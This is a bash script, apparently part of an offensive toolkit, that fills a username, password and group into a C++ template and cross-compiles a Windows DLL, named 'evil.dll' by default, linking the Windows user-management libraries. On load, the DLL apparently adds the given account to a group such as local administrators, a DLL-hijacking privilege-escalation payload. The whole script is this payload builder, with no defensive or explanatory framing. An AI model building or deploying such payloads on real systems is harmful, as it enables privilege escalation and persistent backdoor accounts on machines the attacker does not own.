#!/bin/bash
set -euo pipefail

USERNAME="" PASSWORD="" GROUP="" OUTPUT_NAME="evil.dll"

while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--user) USERNAME="$2"; shift 2 ;;
        -p|--password) PASSWORD="$2"; shift 2 ;;
        -g|--group) GROUP="$2"; shift 2 ;;
        -o|--output) OUTPUT_NAME="$2"; shift 2 ;;
        *) echo "Usage: -u USER -g GROUP [-p PASS] [-o OUTPUT]"; exit 1 ;;
    esac
done

[[ -z "$USERNAME" || -z "$GROUP" ]] && { echo "Error: -u and -g required"; exit 1; }
[[ ! "$OUTPUT_NAME" =~ \.dll$ ]] && OUTPUT_NAME="${OUTPUT_NAME}.dll"

escape() { echo "${1//\\/\\\\}" | sed 's/"/\\"/g'; }

sed -e "s|{{USERNAME}}|$(escape "$USERNAME")|g" \
    -e "s|{{PASSWORD}}|$(escape "$PASSWORD")|g" \
    -e "s|{{GROUPNAME}}|$(escape "$GROUP")|g" \
    /build/template.cpp > /tmp/src.cpp

x86_64-w64-mingw32-g++ -shared -s -O2 -static \
    -o "/out/${OUTPUT_NAME}" /tmp/src.cpp /build/exports.def \
    -lnetapi32 -ladvapi32 -municode -Wl,--subsystem,windows || exit 1

if [[ -z "$PASSWORD" ]]; then
    echo "DLL created: /out/${OUTPUT_NAME}"
    echo "$USERNAME added to group: $GROUP"
else
    echo "DLL created: /out/${OUTPUT_NAME}"
    echo "$USERNAME with password $PASSWORD added to group: $GROUP"
fi
